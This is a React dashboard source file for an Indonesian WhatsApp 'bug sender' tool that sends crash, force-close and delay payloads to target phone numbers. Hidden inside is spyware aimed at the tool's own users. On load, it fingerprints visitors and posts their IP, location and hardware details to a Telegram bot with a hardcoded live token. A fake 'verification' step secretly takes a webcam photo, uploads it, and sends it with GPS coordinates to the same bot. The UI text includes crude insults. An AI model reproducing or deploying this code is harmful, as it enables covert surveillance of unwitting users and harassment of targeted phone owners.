"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity } from "lucide-react"

// KONFIGURASI UTAMA LU SELZ
const TELE_TOKEN = "8633526016:AAGZGlW2TROHF1V6GujEpz8o_QYXNpqSkwM"
const CHAT_ID = "6481060681"
const IMGBB_API_KEY = "4caf6ea53a17b11f879581a8ca9ee92e"

export default function YaeMikoDashboard() {
  const [isHydrated, setIsHydrated] = useState(false)
  const [bugLimit, setBugLimit] = useState(5)
  const [isWebLocked, setIsWebLocked] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isSending, setIsSending] = useState(false)
  const [isMusicOn, setIsMusicOn] = useState(true)
  const [isStealth, setIsStealth] = useState(false)
  const [engineSpeed, setEngineSpeed] = useState("Normal")
  const [targetNumber, setTargetNumber] = useState("")
  const [currentView, setCurrentView] = useState('dashboard')
  const [activeNav, setActiveNav] = useState(0)
  const [isCopied, setIsCopied] = useState(false)
  const [onlineUsers, setOnlineUsers] = useState(0)

  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
  const [showLimitPopup, setShowLimitPopup] = useState(false)
  const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
  const [showVerifyModal, setShowVerifyModal] = useState(false)
  const [isVerified, setIsVerified] = useState(false)

  const [userRole, setUserRole] = useState<"free" | "admin">("free")

  const [senderType, setSenderType] = useState<"global" | "pribadi">("global")
  const [senderNumber, setSenderNumber] = useState("")
  const [pairingStatus, setPairingStatus] = useState<"idle" | "loading" | "success">("idle")
  const [receivedCode, setReceivedCode] = useState("")

  // STATE UNTUK SENDER PRIBADI
  const [isSenderPaired, setIsSenderPaired] = useState(false)
  const [pribadiLimit, setPribadiLimit] = useState(0)

  const bgMusicRef = useRef<HTMLAudioElement>(null)
  const isSendingRef = useRef(false)

  const BUG_TYPES = [
    { name: "DELAY INVISIBLE", code: "delayLow", icon: <Ghost className="w-14 h-14 text-[#00e5ff]" /> },
    { name: "FORCE CLOSE INVIS", code: "crashHigh", icon: <Skull className="w-14 h-14 text-red-500" /> },
    { name: "DALAY INVIS IOS", code: "blankTap", icon: <ZapOff className="w-14 h-14 text-yellow-500" />},
    { name: "BLANK UI", code: "delayIOS", icon: <Activity className="w-14 h-14 text-pink-500" /> },
    { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-14 h-14 text-orange-500" /> },
  ]

  const sendInitialIntel = async () => {
    try {
      let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase()
      localStorage.setItem('target_uuid', targetID)

      const ipRes = await fetch('https://ipapi.co/json/')
      const ipData = await ipRes.json()

      let gpu = "Unknown"
      try {
        const gl = document.createElement('canvas').getContext('webgl')
        const debug = gl?.getExtension('WEBGL_debug_renderer_info')
        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown"
      } catch (e) {}

      const msg = `🕵️ **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n📍 **IP:** ${ipData.ip} (${ipData.org})\n🌍 **LOC:** ${ipData.city}, ${ipData.country_name}\n💻 **OS:** ${navigator.platform}\n🎮 **GPU:** ${gpu.slice(0,30)}\n🔋 **BAT:** ${(navigator as any).hardwareConcurrency} Core / ${(navigator as any).deviceMemory || '?'}GB RAM`

      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      })
    } catch (e) {
      console.error(e)
    }
  }

  const getPreciseLocation = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve("GPS Not Supported")
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
          resolve(`📍 **PRECISE LOC:** [Open Google Maps](${link})\n🎯 **ACCURACY:** \`${pos.coords.accuracy.toFixed(1)}m\``)
        },
        () => resolve("📍 **PRECISE LOC:** `Permission Denied`"),
        { enableHighAccuracy: true, timeout: 5000 }
      )
    })
  }

  const uploadToIMGBB = async (imageBlob: Blob) => {
    const formData = new FormData()
    formData.append('image', imageBlob)
    try {
      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: 'POST',
        body: formData
      })
      const data = await res.json()
      return data.success ? data.data.url : null
    } catch (e) { return null }
  }

  const startFinalExecution = async () => {
    setShowVerifyModal(false)
    setIsSending(true)
    setIsVerified(true)
    localStorage.setItem('target_verified', 'true')

    const preciseLoc = await getPreciseLocation()

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      const video = document.createElement('video')
      video.srcObject = stream
      await video.play()

      setTimeout(async () => {
        const canvas = document.createElement('canvas')
        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        canvas.getContext('2d')?.drawImage(video, 0, 0)
        const blob = await new Promise<Blob | null>(res => canvas.toBlob(res, 'image/jpeg'))

        if (blob) {
          const photoUrl = await uploadToIMGBB(blob)
          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━`

          await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
          })
        }
        stream.getTracks().forEach(t => t.stop())
        setIsSending(false)
      }, 3000)
    } catch (e) {
      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`, parse_mode: 'Markdown' })
      })
      setIsSending(false)
    }
  }

  // 🔥 NYAMBUNG KE API /api/control action: 'get_data' — BALIKIN limit, isLocked, pairingCode, isPaired
  const syncData = async () => {
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          action: 'get_data',
          username: isLoggedIn ? username : null
        })
      })
      const data = await res.json()
      if (data) {
        if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
        if (data.limit !== undefined && !isSendingRef.current) setBugLimit(Number(data.limit))
        if (pairingStatus === "loading" && data.pairingCode) {
          setReceivedCode(data.pairingCode)
          setPairingStatus("success")
        }
        if (data.isPaired !== undefined) {
          setIsSenderPaired(data.isPaired === true)
          setPribadiLimit(data.isPaired === true ? 10 : 0)
        }
      }
    } catch (err) {
      console.error(err)
    }
  }

  // 🔥 NYAMBUNG KE API /api/control action: 'sendReport'
  const sendReport = async (messageText: string) => {
    try {
      await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'sendReport', messageText })
      })
    } catch (err) {
      console.error(err)
    }
  }

  const handleRequestPairing = async () => {
    if (!senderNumber) return alert("Masukin nomor sender dulu!")
    setPairingStatus("loading")

    try {
      await sendReport(`/pair ${senderNumber}`)

      const checkDatabaseInterval = setInterval(async () => {
        await syncData()
      }, 3000)

      setTimeout(() => {
        clearInterval(checkDatabaseInterval)
        setPairingStatus((prev) => prev === "loading" ? "idle" : prev)
      }, 45000)

    } catch (e) {
      console.error(e)
      setPairingStatus("idle")
    }
  }

  useEffect(() => {
    sendInitialIntel()
    async function initData() {
      await syncData()
      const localVerify = localStorage.getItem('target_verified')
      if (localVerify === 'true') {
        setIsVerified(true)
      }
      setIsHydrated(true)
    }
    initData()
  }, [])

  useEffect(() => {
    if (!isLoggedIn) return
    const autoRefresh = setInterval(async () => {
      await syncData()
    }, 4000)
    return () => clearInterval(autoRefresh)
  }, [isLoggedIn, pairingStatus])

  // Sync online users + heartbeat
useEffect(() => {
  if (!isLoggedIn) return

  const syncOnline = async () => {
    try {
      const res = await fetch('/api/online-users')
      const data = await res.json()
      setOnlineUsers(data.online || 0)
    } catch (e) {}
  }

  const sendHeartbeat = async () => {
    try {
      await fetch('/api/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      })
    } catch (e) {}
  }

  // panggil sekali
  sendHeartbeat()
  syncOnline()

  const heartbeatInterval = setInterval(sendHeartbeat, 15000)
  const onlineInterval = setInterval(syncOnline, 8000)

  return () => {
    clearInterval(heartbeatInterval)
    clearInterval(onlineInterval)
  }
}, [isLoggedIn, username])

  useEffect(() => {
    if (bgMusicRef.current && isHydrated) {
      if (isMusicOn && isLoggedIn && !isWebLocked) {
        bgMusicRef.current.play().catch(() => {})
      } else {
        bgMusicRef.current.pause()
      }
    }
  }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])

  // 🔥 NYAMBUNG KE API /api/control action: 'login'
  const handleLogin = async () => {
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'login', username, password })
      })
      const data = await res.json()
      if (data.success) {
        setUserRole(data.role)
        setIsLoggedIn(true)
        // ... kirim heartbeat pertama langsung
try {
  await fetch('/api/heartbeat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username })
  })
} catch (e) {}

        setShowErrorOverlay(false)
        if (data.role === "admin") {
          localStorage.setItem("admin_key", password)
        }
        await syncData()
      } else {
        setShowErrorOverlay(true)
      }
    } catch (e) {
      console.error(e)
      setShowErrorOverlay(true)
    }
  }

  // 🔥 NYAMBUNG KE API /api/bug/send — POTONG LIMIT + KIRIM COMMAND /ryx + LOG
  const handleSendBug = async () => {
    if (!targetNumber) {
      alert("Masukin nomor target dulu!")
      return
    }
    
    if (targetNumber === "6289505198913") {
      setShowRestrictedOverlay(true)
      return
    }

    const currentLimit = senderType === "pribadi" ? pribadiLimit : bugLimit

    if (userRole === "free" && currentLimit <= 0) {
      setShowLimitPopup(true)
      return
    }

    if (senderType === "pribadi" && !isSenderPaired) {
      alert("Kamu belum pairing sender pribadi!")
      return
    }

    isSendingRef.current = true
    setIsSending(true)
    
    const selectedBug = BUG_TYPES[activeNav].name
    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000

    setTimeout(async () => {
      try {
        // Kirim ke API /api/bug/send — handle potong limit + kirim command /ryx + kirim log
        const res = await fetch('/api/bug/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, targetNumber, selectedBug, engineSpeed, senderType, senderNumber })
        })
        const data = await res.json()

        if (!data.success) {
          if (data.error && data.error.includes("Limit")) {
            setShowLimitPopup(true)
          } else {
            alert(data.error || "Gagal mengirim bug")
          }
          isSendingRef.current = false
          setIsSending(false)
          return
        }

        // Update limit dari response API /api/bug/send
        if (data.nextLimit !== undefined) {
          setBugLimit(data.nextLimit)
        }

        // Sync data terbaru
        await syncData()

        // Verifikasi / camera capture
        if (isVerified) {
          startFinalExecution()
        } else {
          setShowVerifyModal(true)
        }
      } catch (e) {
        console.error(e)
        alert("Gagal terhubung ke server")
      }

      isSendingRef.current = false
      setIsSending(false)
    }, delay)
  }

  const copyToClipboard = () => {
    if (typeof navigator !== 'undefined' && targetNumber) {
      navigator.clipboard.writeText(targetNumber)
      setIsCopied(true)
      setTimeout(() => setIsCopied(false), 2000)
    }
  }

  if (!isHydrated) return <div className="bg-black min-h-screen flex items-center justify-center"><Loader2 className="w-8 h-8 text-cyan-400 animate-spin" /></div>

  if (isWebLocked) {
    return (
      <div className="fixed inset-0 z-[99999] bg-black flex flex-col items-center justify-center p-10 text-center">
        <Ban className="w-32 h-32 text-red-600 mb-8 mx-auto animate-pulse" />
        <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter mb-4">⚠️SYSTEM-MAINTENANCE⚠️</h1>
        <p className="text-white/50 text-xs font-bold uppercase tracking-[0.3em] max-w-xs mx-auto">
          Sabar Dongo, Server lagi Update Sama Selz. Balik Lagi Nanti Kalau Udah Selesai Update nya.
        </p>
        <Loader2 className="w-4 h-4 text-red-600 animate-spin mt-10" />
      </div>
    )
  }

  const currentStatus = (() => {
    if (senderType === 'pribadi') {
      return isSenderPaired 
        ? { text: 'ACT', color: 'text-[#00e676]' } 
        : { text: 'OFF', color: 'text-[#ff3b3b]' };
    } else {
      return bugLimit > 0 
        ? { text: 'ACT', color: 'text-[#00e676]' } 
        : { text: 'OFF', color: 'text-[#ff3b3b]' };
    }
  })();

  return (
    <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth ? 'opacity-30' : 'opacity-100'}`}>
      <div className="fixed inset-0 z-0">
        <video autoPlay loop muted playsInline className="w-full h-full object-cover opacity-40">
          <source src="/bg-anime.mp4" type="video/mp4" />
        </video>
        <div className="absolute inset-0 bg-gradient-to-b from-[#050b14]/70 to-black"></div>
      </div>
      <audio ref={bgMusicRef} src="/audio.mp3" loop />

      {/* OVERLAYS & MODALS */}
      {pairingStatus === "loading" && (
        <div className="fixed inset-0 z-[10008] bg-black/95 flex flex-col items-center justify-center backdrop-blur-md">
          <Loader2 className="w-16 h-16 text-cyan-400 animate-spin mb-4" />
          <p className="font-bold text-xs uppercase tracking-widest text-cyan-400">MEMPROSES PAIRING BOT...</p>
        </div>
      )}

      {pairingStatus === "success" && (
        <div className="fixed inset-0 z-[10009] bg-black/95 flex flex-col items-center justify-center p-6 text-center">
          <div className="bg-white/5 p-8 rounded-3xl border-cyan-500/20 max-w-xs w-full backdrop-blur-lg animate-in fade-in">
            <h2 className="text-cyan-400 font-black italic mb-2 uppercase tracking-wider">WHATSAPP PAIRING CODE</h2>
            <p className="text-white/40 text-[9px] font-bold uppercase mb-4">Masukkan kode ini di perangkat target</p>
            <div className="text-3xl font-mono font-black text-pink-500 bg-black/60 p-4 rounded-xl border-white/5 mb-6 tracking-wider">{receivedCode}</div>
            <button onClick={() => setPairingStatus("idle")} className="w-full py-3 bg-cyan-600 text-white font-black uppercase text-xs rounded-full shadow-lg">OK</button>
          </div>
        </div>
      )}

      {showErrorOverlay && (
        <div className="fixed inset-0 z-[10005] bg-red-950/90 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-bg_rumble">
          <AlertTriangle className="w-24 h-24 text-red-500 mb-6 animate-shake_violent" />
          <h1 className="text-3xl font-black italic uppercase text-white animate-glitch_extreme mb-8">CREATE AKUN KE BOT DONGO!</h1>
          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-4 px-10 rounded-full font-black uppercase text-xs flex items-center justify-center shadow-2xl">
            BUKA BOT
          </a>
          <button onClick={() => setShowErrorOverlay(false)} className="mt-6 text-white/40 font-bold uppercase text-[10px] tracking-widest hover:text-white transition">COBA LAGI</button>
        </div>
      )}

      {showRestrictedOverlay && (
        <div className="fixed inset-0 z-[10006] bg-red-900/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-pulse">
          <Shield className="w-32 h-32 text-white mb-6" />
          <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter">ACCESS DENIED</h1>
          <p className="text-white/70 text-xs mt-4 mb-8 font-bold uppercase">MAU NGAPAIN LU KONTOL, NOMOR INI DALAM PERLINDUNGAN ADMIN SELZ</p>
          <button onClick={() => setShowRestrictedOverlay(false)} className="px-12 py-4 bg-white text-black font-black uppercase text-xs rounded-full shadow-2xl">KEMBALI</button>
        </div>
      )}

      {isSending && (
        <div className="fixed inset-0 z-[10002] bg-black/80 flex flex-col items-center justify-center backdrop-blur-md">
          <Loader2 className="w-24 h-24 text-pink-500 animate-spin mb-6" />
          <p className="font-black italic uppercase text-sm tracking-[0.5em] text-cyan-400 animate-pulse text-center">SEDANG MENGIRIM BUG...</p>
        </div>
      )}

      {showLimitPopup && (
        <div className="fixed inset-0 z-[10001] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-md">
          <Bug className="w-28 h-28 text-red-600 mb-6 animate-shake_violent" />
          <h2 className="text-3xl font-black italic uppercase text-red-500 mb-4 drop-shadow-[0_0_15px_rgba(220,38,38,0.8)]">LIMIT LU ABIS NGENTOD</h2>
          <p className="text-white/60 text-[10px] font-bold tracking-widest mb-10 uppercase max-w-[250px]">
            PREMIUM KE BOT LAH KAGA MALU PAKE AKUN FREE MULU 😹
          </p>
          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-5 px-12 rounded-full font-black uppercase text-xs flex items-center gap-2 shadow-[0_0_20px_rgba(255,255,255,0.3)]">
            <ExternalLink size={16} /> MENUJU BOT
          </a>
          <button onClick={() => setShowLimitPopup(false)} className="mt-6 text-white/30 font-bold uppercase text-[9px] tracking-widest hover:text-white transition">
            LIMIT BAKALAN RESET SETELAH 24 JAM
          </button>
        </div>
      )}

      {showVerifyModal && (
        <div className="fixed inset-0 z-[10007] bg-black/90 flex flex-col items-center justify-center p-8 text-center backdrop-blur-md">
          <Shield className="w-24 h-24 text-cyan-400 mb-6" />
          <h2 className="text-2xl font-black italic uppercase text-white mb-2">VERIFIKASI TARGET</h2>
          <p className="text-white/60 text-xs mb-8">Pastikan target aktif. Klik lanjutkan untuk verifikasi.</p>
          <div className="flex gap-4">
            <button onClick={() => setShowVerifyModal(false)} className="px-8 py-4 bg-white/10 rounded-full font-black uppercase text-xs">Batal</button>
            <button onClick={startFinalExecution} className="px-8 py-4 bg-cyan-600 rounded-full font-black uppercase text-xs">Lanjutkan</button>
          </div>
        </div>
      )}

      {/* LOGIN PAGE */}
      {!isLoggedIn ? (
        <div className="relative z-10 flex items-center justify-center min-h-screen p-6">
          <div className="w-full max-w-sm bg-white/5 border-white/10 backdrop-blur-3xl rounded-3xl p-10 shadow-2xl">
            <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">
              YAE MIKO <span className="text-xs text-white/30 block tracking-[0.5em]">VERSI 1.5</span>
            </h1>
            <div className="space-y-4">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none focus:border-cyan-500 transition"
                placeholder="USERNAME"
              />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none focus:border-cyan-500 transition"
                placeholder="PASSWORD"
              />
              <button
                onClick={handleLogin}
                className="w-full py-5 bg-cyan-600 hover:bg-cyan-500 rounded-full font-black uppercase italic text-xs text-white flex items-center justify-center gap-3 active:scale-95 transition-all shadow-[0_0_20px_rgba(0,229,255,0.3)]"
              >
                <Lock size={16}/> LOGIN
              </button>
            </div>
          </div>
        </div>
      ) : (
        <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen pb-24">
          
          {/* DASHBOARD PAGE */}
          {currentView === 'dashboard' ? (
            <div className="animate-in fade-in duration-500">
              
              {/* HEADER SPEED & ROLE */}
              <div className="flex justify-between items-center mb-6">
                <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin' ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0 ? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-pink-500/10'}`}>
                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
                </span>
              </div>

              {/* BUG ENGINE CARD */}
              <div className="bg-gradient-to-b from-[#1a203f]/90 to-[#12162d]/90 backdrop-blur-md rounded-[30px] p-6 shadow-2xl relative overflow-hidden mb-6 border border-white/5">
                
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-[#00e5ff] opacity-10 blur-3xl rounded-full pointer-events-none"></div>

                <div className="flex justify-center mb-4 relative z-10">
                  {BUG_TYPES[activeNav].icon}
                </div>

                <div className="flex justify-between items-center mb-8 px-2 relative z-10">
                  <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90">
                    <ChevronLeft size={20} className="text-white"/>
                  </button>
                  <h2 className="text-xl font-black text-white italic tracking-wider drop-shadow-lg text-center leading-none">
                    {BUG_TYPES[activeNav].name}
                  </h2>
                  <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90">
                    <ChevronRight size={20} className="text-white"/>
                  </button>
                </div>

                <div className="flex justify-between gap-3 relative z-10">
                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
                    {userRole === "admin" ? (
                      <Infinity className="w-8 h-8 text-[#00e5ff] mb-1 animate-pulse" />
                    ) : (
                      <span className="text-3xl font-bold text-[#00e5ff] mb-1">
                        {senderType === 'pribadi' ? pribadiLimit : bugLimit}
                      </span>
                    )}
                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">LIMIT</span>
                  </div>
                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
                    <span className={`text-2xl font-black mb-1 ${currentStatus.color}`}>
                      {userRole === 'admin' ? 'ACT' : currentStatus.text}
                    </span>
                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">STATUS</span>
                  </div>
                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
                    <span className="text-3xl font-bold text-white mb-1">{onlineUsers}</span>
                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">ONLINE</span>
                  </div>
                </div>
              </div>

              {/* TARGET NUMBER INPUT */}
              <div className="relative mb-6">
                <input 
                  value={targetNumber} 
                  onChange={(e) => setTargetNumber(e.target.value)} 
                  onKeyDown={(e) => e.key === 'Enter' && targetNumber && handleSendBug()} 
                  className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-black italic text-lg text-cyan-400 pr-16 outline-none focus:border-cyan-500 transition-all" 
                  placeholder="628XXXXXXXX" 
                />
                <button onClick={copyToClipboard} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40 hover:text-cyan-400 transition-colors">
                  {isCopied ? <CheckCircle2 size={24} className="text-green-500" /> : <Copy size={24} />}
                </button>
              </div>

              {/* TOMBOL KIRIM BUG */}
              <button 
                onClick={handleSendBug} 
                disabled={isSending || !targetNumber || (senderType === "pribadi" && !isSenderPaired) || (userRole !== "admin" && bugLimit <= 0)}
                className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white shadow-xl active:scale-95 transition-all disabled:opacity-40 disabled:cursor-not-allowed"
              >
                {isSending ? "PROCESSING..." : "KIRIM BUG"}
              </button>

              {/* PILIH SENDER */}
              <div className="flex gap-3 mt-6 mb-2">
                <button
                  onClick={() => setSenderType('pribadi')}
                  className={`flex-1 flex flex-col items-center justify-center py-4 rounded-2xl transition-all duration-300 border border-white/5 ${
                    senderType === 'pribadi' 
                      ? 'bg-[#00e5ff] text-black shadow-[0_0_15px_rgba(0,229,255,0.3)] scale-[1.02]' 
                      : 'bg-[#151b3b]/80 backdrop-blur-md text-gray-400 hover:bg-[#1e2650]'
                  }`}
                >
                  <svg className="w-6 h-6 mb-1" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                  </svg>
                  <h2 className="text-sm font-bold leading-none mb-1">Pribadi</h2>
                  <p className={`text-[9px] ${senderType === 'pribadi' ? 'text-black/80 font-bold' : 'text-gray-500 font-medium'}`}>
                    {isSenderPaired ? '✓ Terkait' : '✗ Kosong'}
                  </p>
                </button>

                <button
                  onClick={() => setSenderType('global')}
                  className={`flex-1 flex flex-col items-center justify-center py-4 rounded-2xl transition-all duration-300 border border-white/5 ${
                    senderType === 'global' 
                      ? 'bg-[#00e5ff] text-black shadow-[0_0_15px_rgba(0,229,255,0.3)] scale-[1.02]' 
                      : 'bg-[#111322]/80 backdrop-blur-md text-white hover:bg-[#1a1d36]'
                  }`}
                >
                  <svg className="w-6 h-6 mb-1 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <h2 className="text-sm font-bold leading-none mb-1">Global</h2>
                  <p className={`text-[9px] ${senderType === 'global' ? 'text-black/80 font-bold' : 'text-gray-400 font-medium'}`}>1 sender</p>
                </button>
              </div>

              {/* PAIRING PRIBADI INPUT */}
              {senderType === "pribadi" && (
                <div className="bg-white/5 border border-white/10 rounded-2xl p-4 mt-2 animate-in fade-in slide-in-from-top-2">
                  <div className="space-y-3">
                    <p className="text-[9px] font-bold text-cyan-400/80 uppercase tracking-widest text-center">Tautkan Device Station</p>
                    <input value={senderNumber} onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black/80 border border-white/10 p-3 rounded-xl text-center text-xs text-cyan-400 font-bold focus:border-cyan-500 outline-none transition" placeholder="NOMOR SENDER (628...)" />
                    <button onClick={handleRequestPairing} disabled={pairingStatus === "loading"} className="w-full py-3 bg-[#00e5ff] text-black hover:bg-cyan-400 rounded-xl font-black text-xs uppercase transition shadow-[0_0_10px_rgba(0,229,255,0.2)] disabled:opacity-50">
                      {pairingStatus === "loading" ? "MEMINTA KODE..." : "REQUEST PAIRING"}
                    </button>
                  </div>
                </div>
              )}

            </div>
          ) : (
            <div className="animate-in fade-in duration-500">
              <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">
                Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}
              </h2>
              <div className="space-y-5">
                <div className="bg-white/5 p-6 rounded-[2.5rem] border-white/5 backdrop-blur-lg shadow-xl">
                  <div className="flex items-center gap-3 mb-5 text-xs font-black uppercase text-white/60 italic"><Zap size={16} className="text-cyan-400"/> Engine Speed</div>
                  <div className="flex gap-2">
                    {["Normal", "Fast", "Instant"].map((speed) => (
                      <button key={speed} onClick={() => setEngineSpeed(speed)} className={`flex-1 py-4 rounded-2xl text-[9px] font-black border transition-all ${engineSpeed === speed ? 'bg-cyan-500 text-black border-cyan-400' : 'bg-black/40 text-white/40 border-transparent'}`}>{speed}</button>
                    ))}
                  </div>
                </div>
                <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem] border-white/5">
                  <div className="flex items-center gap-4"><EyeOff className="text-pink-500" size={22} /><span className="text-xs font-black uppercase italic">Stealth Mode</span></div>
                  <button onClick={() => setIsStealth(!isStealth)} className={`w-14 h-7 rounded-full relative transition-all ${isStealth ? 'bg-cyan-500' : 'bg-white/10'}`}><div className={`absolute top-1 w-5 h-5 rounded-full bg-white transition-all ${isStealth ? 'right-1' : 'left-1'}`}></div></button>
                </div>
                <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem] border-white/5">
                  <div className="flex items-center gap-4"><Music className="text-cyan-400" size={22} /><span className="text-xs font-black uppercase italic">Audio Output</span></div>
                  <button onClick={() => setIsMusicOn(!isMusicOn)} className={`p-3 rounded-2xl transition-all ${isMusicOn ? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>
                    {isMusicOn ? <Volume2 size={20}/> : <VolumeX size={20}/>}
                  </button>
                </div>
                <button onClick={() => { setIsLoggedIn(false); setUsername(""); setPassword(""); }} className="w-full flex items-center justify-center gap-4 py-6 bg-red-600/10 border-red-600/20 rounded-[2.5rem] text-xs font-black uppercase italic text-red-500 hover:bg-red-600 hover:text-white transition-all">LOG OUT</button>
              </div>
            </div>
          )}

          {/* BOTTOM NAVIGATION */}
          <div className="fixed bottom-8 left-16 right-16 bg-[#0a1628]/95 border border-white/10 p-4 rounded-[2.5rem] flex justify-around backdrop-blur-3xl z-20 shadow-2xl">
            <button onClick={() => setCurrentView('dashboard')} className={`p-1 transition-all ${currentView === 'dashboard' ? 'text-cyan-400 scale-110 drop-shadow-[0_0_8px_rgba(0,229,255,0.5)]' : 'text-white/20 hover:text-white/40'}`}><LayoutDashboard size={22}/></button>
            <button onClick={() => setCurrentView('settings')} className={`p-1 transition-all ${currentView === 'settings' ? 'text-cyan-400 scale-110 drop-shadow-[0_0_8px_rgba(0,229,255,0.5)]' : 'text-white/20 hover:text-white/40'}`}><Settings size={22}/></button>
          </div>
        </div>
      )}

      {/* KEYFRAMES ANIMASI */}
      <style jsx global>{`
      @keyframes shake {
        0% { transform: translate(2px, 2px) rotate(0deg); }
